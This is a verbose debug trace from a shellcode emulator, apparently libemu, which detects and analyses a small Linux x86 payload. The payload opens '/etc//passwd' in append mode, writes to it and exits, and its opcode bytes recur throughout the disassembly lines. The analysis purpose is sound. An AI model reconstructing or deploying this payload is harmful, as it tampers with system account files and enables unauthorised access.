verbose = 64
[emu 0x0xa057378 [31;1mdebug[0m ] in <emu_shellcode_test> emu_shellcode.c:470>
[emu 0x0xa057378 [31;1mdebug[0m ] possible getpc at offset 38 (00000026)
[emu 0x0xa057378 [31;1mdebug[0m ] creating static callgraph
[emu 0x0xa057378 [32;1minfo[0m ] The following function is a stub instr_das_2f functions/misc.c:63 
[emu 0x0xa057378 [32;1minfo[0m ] The following function is a stub instr_das_2f functions/misc.c:63 
[emu 0x0xa057378 [32;1minfo[0m ] The following function is a stub instr_das_2f functions/misc.c:63 
[emu 0x0xa057378 [32;1minfo[0m ] The following function is a stub instr_das_2f functions/misc.c:63 
[emu 0x0xa057378 [32;1minfo[0m ] The following function is a stub instr_das_2f functions/misc.c:63 
[emu 0x0xa057378 [32;1minfo[0m ] The following function is a stub instr_das_2f functions/misc.c:63 
[emu 0x0xa057378 [32;1minfo[0m ] The following function is a stub instr_das_2f functions/misc.c:63 
[emu 0x0xa057378 [31;1mdebug[0m ] testing offset 38 00000026
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657190 00471026
[emu 0x0xa057378 [31;1mdebug[0m ] E8                              call 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 59                              pop ecx
[emu 0x0xa057378 [31;1mdebug[0m ] 8B51FC                          mov edx,[ecx-0x4]
[emu 0x0xa057378 [31;1mdebug[0m ] 6A04                            push byte 0x4
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 6A01                            push byte 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] error at 0000                            add [eax],al (Bad address)
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657190 471026 steps 9
[emu 0x0xa057378 [31;1mdebug[0m ] brute force!
[emu 0x0xa057378 [31;1mdebug[0m ] brute at offset 0x00000026 
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657190 00471026
[emu 0x0xa057378 [31;1mdebug[0m ] E8                              call 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 59                              pop ecx
[emu 0x0xa057378 [31;1mdebug[0m ] 8B51FC                          mov edx,[ecx-0x4]
[emu 0x0xa057378 [31;1mdebug[0m ] 6A04                            push byte 0x4
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 6A01                            push byte 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] error at 0000                            add [eax],al (Bad address)
[emu 0x0xa057378 [31;1mdebug[0m ] goto traversal
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 0000                            add [eax],al
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 00471061
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05f4f8 471026: E8                              call 0x1 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] FollowSingle 0xa05f318 6 471025 93                              xchg eax,ebx
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] FollowSingle 0xa05f068 6 471023 CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] FollowSingle 0xa05edf8 6 471021 B504                            mov ch,0x4
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05eb88 47101f E3                              jecxz 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05ecc0 471020 41                              inc ecx
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657185 00471021
[emu 0x0xa057378 [31;1mdebug[0m ] marking white 0xa05ee98 471021: B504                            mov ch,0x4 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05ec28 47101f: E3                              jecxz 0x1 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657183 0047101f
[emu 0x0xa057378 [31;1mdebug[0m ] marking white 0xa05ec28 47101f: E3                              jecxz 0x1 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05ed60 471020: 41                              inc ecx 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] FollowSingle 0xa05ea80 6 47101e 89E3                            mov ebx,esp
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05e570 471019 682F657463                      push dword 0x6374652f
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05e810 47101b 6574                            ?? jz 0x2
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05e948 47101c 74                              jz 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657182 0047101e
[emu 0x0xa057378 [31;1mdebug[0m ] marking white 0xa05eaf0 47101e: 89E3                            mov ebx,esp 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05e620 471019: 682F657463                      push dword 0x6374652f 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05ddc0 471013 64682F2F7061                    fs push dword 0x61702f2f
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05df08 471014 682F2F7061                      push dword 0x61702f2f
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05e300 471017 70                              jo 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05e438 471018 61                              popa 
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657177 00471019
[emu 0x0xa057378 [31;1mdebug[0m ] marking white 0xa05e620 471019: 682F657463                      push dword 0x6374652f 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05e8b0 47101b: 6574                            ?? jz 0x2 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] FollowSingle 0xa05e720 6 47101a 2F                              das 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657178 0047101a
[emu 0x0xa057378 [31;1mdebug[0m ] marking white 0xa05e790 47101a: 2F                              das  
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05e9e8 47101c: 74                              jz 0x1 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657180 0047101c
[emu 0x0xa057378 [31;1mdebug[0m ] marking white 0xa05e9e8 47101c: 74                              jz 0x1 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05de70 471013: 64682F2F7061                    fs push dword 0x61702f2f 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] FollowSingle 0xa05db50 6 471011 73                              jnc 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657169 00471011
[emu 0x0xa057378 [31;1mdebug[0m ] marking white 0xa05dbf0 471011: 73                              jnc 0x1 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05dfb8 471014: 682F2F7061                      push dword 0x61702f2f 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05d8d0 47100f 6873737764                      push dword 0x64777373
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05dc88 471012 77                              ja 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657172 00471014
[emu 0x0xa057378 [31;1mdebug[0m ] marking white 0xa05dfb8 471014: 682F2F7061                      push dword 0x61702f2f 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05e3a0 471017: 70                              jo 0x1 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] FollowSingle 0xa05e210 6 471016 2F                              das 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] FollowSingle 0xa05e0b8 6 471015 2F                              das 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657173 00471015
[emu 0x0xa057378 [31;1mdebug[0m ] marking white 0xa05e128 471015: 2F                              das  
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05e4d8 471018: 61                              popa  
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657176 00471018
[emu 0x0xa057378 [31;1mdebug[0m ] marking white 0xa05e4d8 471018: 61                              popa  
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05d980 47100f: 6873737764                      push dword 0x64777373 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05d2b0 47100a 055831C951                      add eax,0x51c93158
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05d798 47100e 51                              push ecx
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657167 0047100f
[emu 0x0xa057378 [31;1mdebug[0m ] marking white 0xa05d980 47100f: 6873737764                      push dword 0x64777373 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05dd28 471012: 77                              ja 0x1 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] FollowSingle 0xa05da18 6 471010 73                              jnc 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657168 00471010
[emu 0x0xa057378 [31;1mdebug[0m ] marking white 0xa05dab8 471010: 73                              jnc 0x1 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05d358 47100a: 055831C951                      add eax,0x51c93158 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657162 0047100a
[emu 0x0xa057378 [31;1mdebug[0m ] marking white 0xa05d358 47100a: 055831C951                      add eax,0x51c93158 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05d838 47100e: 51                              push ecx 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05d528 47100c 31C9                            xor ecx,ecx
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05d660 47100d C9                              leave 
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657166 0047100e
[emu 0x0xa057378 [31;1mdebug[0m ] marking white 0xa05d838 47100e: 51                              push ecx 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05d5c8 47100c: 31C9                            xor ecx,ecx 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05d028 471008 806A0558                        sub byte [edx+0x5],0x58
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05d3f0 47100b 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657164 0047100c
[emu 0x0xa057378 [31;1mdebug[0m ] marking white 0xa05d5c8 47100c: 31C9                            xor ecx,ecx 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05d700 47100d: C9                              leave  
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657165 0047100d
[emu 0x0xa057378 [31;1mdebug[0m ] marking white 0xa05d700 47100d: C9                              leave  
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05d0d8 471008: 806A0558                        sub byte [edx+0x5],0x58 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657160 00471008
[emu 0x0xa057378 [31;1mdebug[0m ] marking white 0xa05d0d8 471008: 806A0558                        sub byte [edx+0x5],0x58 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05d490 47100b: 58                              pop eax 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] FollowSingle 0xa05d170 6 471009 6A05                            push byte 0x5
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] FollowSingle 0xa05cef0 6 471007 CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] FollowSingle 0xa05cdb8 6 471006 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05cb40 471004 6A46                            push byte 0x46
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05cc80 471005 46                              inc esi
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657158 00471006
[emu 0x0xa057378 [31;1mdebug[0m ] marking white 0xa05ce58 471006: 58                              pop eax 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05cbe8 471004: 6A46                            push byte 0x46 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] FollowSingle 0xa05ca08 6 471002 89CB                            mov ebx,ecx
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05c790 471000 31C9                            xor ecx,ecx
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05c938 471001 C9                              leave 
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657154 00471002
[emu 0x0xa057378 [31;1mdebug[0m ] marking white 0xa05caa8 471002: 89CB                            mov ebx,ecx 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05cd20 471005: 46                              inc esi 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657157 00471005
[emu 0x0xa057378 [31;1mdebug[0m ] marking white 0xa05cd20 471005: 46                              inc esi 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05c680 471000: 31C9                            xor ecx,ecx 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657152 00471000
[emu 0x0xa057378 [31;1mdebug[0m ] marking white 0xa05c680 471000: 31C9                            xor ecx,ecx 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05c8d0 471001: C9                              leave  
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657153 00471001
[emu 0x0xa057378 [31;1mdebug[0m ] marking white 0xa05c8d0 471001: C9                              leave  
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657190 471026 steps 9
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657185 00471021
[emu 0x0xa057378 [31;1mdebug[0m ] B504                            mov ch,0x4
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 93                              xchg eax,ebx
[emu 0x0xa057378 [31;1mdebug[0m ] E8                              call 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 59                              pop ecx
[emu 0x0xa057378 [31;1mdebug[0m ] 8B51FC                          mov edx,[ecx-0x4]
[emu 0x0xa057378 [31;1mdebug[0m ] 6A04                            push byte 0x4
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 6A01                            push byte 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] error at 0000                            add [eax],al (Bad address)
[emu 0x0xa057378 [31;1mdebug[0m ] goto traversal
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 0000                            add [eax],al
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 00471061
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05ee98 471021: B504                            mov ch,0x4 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05eb88 47101f E3                              jecxz 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657185 00471021
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] Known Again 0xa05eb88 47101f
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657185 471021 steps 12
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657183 0047101f
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr E3                              jecxz 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 0047101f
[emu 0x0xa057378 [31;1mdebug[0m ] Known 0xa09a2f8 47101f
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657183 47101f steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657182 0047101e
[emu 0x0xa057378 [31;1mdebug[0m ] 89E3                            mov ebx,esp
[emu 0x0xa057378 [31;1mdebug[0m ] 41                              inc ecx
[emu 0x0xa057378 [31;1mdebug[0m ] B504                            mov ch,0x4
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 93                              xchg eax,ebx
[emu 0x0xa057378 [31;1mdebug[0m ] E8                              call 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 59                              pop ecx
[emu 0x0xa057378 [31;1mdebug[0m ] 8B51FC                          mov edx,[ecx-0x4]
[emu 0x0xa057378 [31;1mdebug[0m ] 6A04                            push byte 0x4
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 6A01                            push byte 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] error at 0000                            add [eax],al (Bad address)
[emu 0x0xa057378 [31;1mdebug[0m ] goto traversal
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 0000                            add [eax],al
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 00471061
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05eaf0 47101e: 89E3                            mov ebx,esp 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05e570 471019 682F657463                      push dword 0x6374652f
[emu 0x0xa057378 [31;1mdebug[0m ] EnqueueLoop 0xa05e948 47101c 74                              jz 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657182 0047101e
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] Known Again 0xa05e570 471019
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] Known Again 0xa05e948 47101c
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657182 47101e steps 14
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657177 00471019
[emu 0x0xa057378 [31;1mdebug[0m ] 682F657463                      push dword 0x6374652f
[emu 0x0xa057378 [31;1mdebug[0m ] 89E3                            mov ebx,esp
[emu 0x0xa057378 [31;1mdebug[0m ] 41                              inc ecx
[emu 0x0xa057378 [31;1mdebug[0m ] B504                            mov ch,0x4
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 93                              xchg eax,ebx
[emu 0x0xa057378 [31;1mdebug[0m ] E8                              call 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 59                              pop ecx
[emu 0x0xa057378 [31;1mdebug[0m ] 8B51FC                          mov edx,[ecx-0x4]
[emu 0x0xa057378 [31;1mdebug[0m ] 6A04                            push byte 0x4
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 6A01                            push byte 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] error at 0000                            add [eax],al (Bad address)
[emu 0x0xa057378 [31;1mdebug[0m ] goto traversal
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 0000                            add [eax],al
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 00471061
[emu 0x0xa057378 [31;1mdebug[0m ] Known 0xa096b48 471019
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657177 471019 steps 15
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657178 0047101a
[emu 0x0xa057378 [32;1minfo[0m ] The following function is a stub instr_das_2f functions/misc.c:63 
[emu 0x0xa057378 [31;1mdebug[0m ] 2F                              das 
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 6574                            ?? jz 0x2
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 0047101b
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05e790 47101a: 2F                              das  
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657178 0047101a
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657178 47101a steps 1
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657180 0047101c
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 74                              jz 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 0047101c
[emu 0x0xa057378 [31;1mdebug[0m ] Known 0xa091448 47101c
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657180 47101c steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657169 00471011
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 73                              jnc 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 00471011
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:297
[emu 0x0xa057378 [31;1mdebug[0m ] marking red 0xa05dbf0 471011: 73                              jnc 0x1 
[emu 0x0xa057378 [31;1mdebug[0m ] loop emu_shellcode.c:332
[emu 0x0xa057378 [31;1mdebug[0m ] found position which satiesfies the requirements 4657169 00471011
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657169 471011 steps 0
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657172 00471014
[emu 0x0xa057378 [31;1mdebug[0m ] 682F2F7061                      push dword 0x61702f2f
[emu 0x0xa057378 [31;1mdebug[0m ] 682F657463                      push dword 0x6374652f
[emu 0x0xa057378 [31;1mdebug[0m ] 89E3                            mov ebx,esp
[emu 0x0xa057378 [31;1mdebug[0m ] 41                              inc ecx
[emu 0x0xa057378 [31;1mdebug[0m ] B504                            mov ch,0x4
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 93                              xchg eax,ebx
[emu 0x0xa057378 [31;1mdebug[0m ] E8                              call 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 59                              pop ecx
[emu 0x0xa057378 [31;1mdebug[0m ] 8B51FC                          mov edx,[ecx-0x4]
[emu 0x0xa057378 [31;1mdebug[0m ] 6A04                            push byte 0x4
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 6A01                            push byte 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] error at 0000                            add [eax],al (Bad address)
[emu 0x0xa057378 [31;1mdebug[0m ] goto traversal
[emu 0x0xa057378 [31;1mdebug[0m ] failed instr 0000                            add [eax],al
[emu 0x0xa057378 [31;1mdebug[0m ] tracking at eip 00471061
[emu 0x0xa057378 [31;1mdebug[0m ] Known 0xa08cf10 471014
[emu 0x0xa057378 [31;1mdebug[0m ] INSERT 4657172 471014 steps 16
[emu 0x0xa057378 [31;1mdebug[0m ] running at offset 4657173 00471015
[emu 0x0xa057378 [32;1minfo[0m ] The following function is a stub instr_das_2f functions/misc.c:63 
[emu 0x0xa057378 [31;1mdebug[0m ] 2F                              das 
[emu 0x0xa057378 [32;1minfo[0m ] The following function is a stub instr_das_2f functions/misc.c:63 
[emu 0x0xa057378 [31;1mdebug[0m ] 2F                              das 
[emu 0x0xa057378 [31;1mdebug[0m ] 70                              jo 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 682F657463                      push dword 0x6374652f
[emu 0x0xa057378 [31;1mdebug[0m ] 89E3                            mov ebx,esp
[emu 0x0xa057378 [31;1mdebug[0m ] 41                              inc ecx
[emu 0x0xa057378 [31;1mdebug[0m ] B504                            mov ch,0x4
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
[emu 0x0xa057378 [31;1mdebug[0m ] 93                              xchg eax,ebx
[emu 0x0xa057378 [31;1mdebug[0m ] E8                              call 0x1
[emu 0x0xa057378 [31;1mdebug[0m ] 59                              pop ecx
[emu 0x0xa057378 [31;1mdebug[0m ] 8B51FC                          mov edx,[ecx-0x4]
[emu 0x0xa057378 [31;1mdebug[0m ] 6A04                            push byte 0x4
[emu 0x0xa057378 [31;1mdebug[0m ] 58                              pop eax
[emu 0x0xa057378 [31;1mdebug[0m ] CD80                            int 0x80
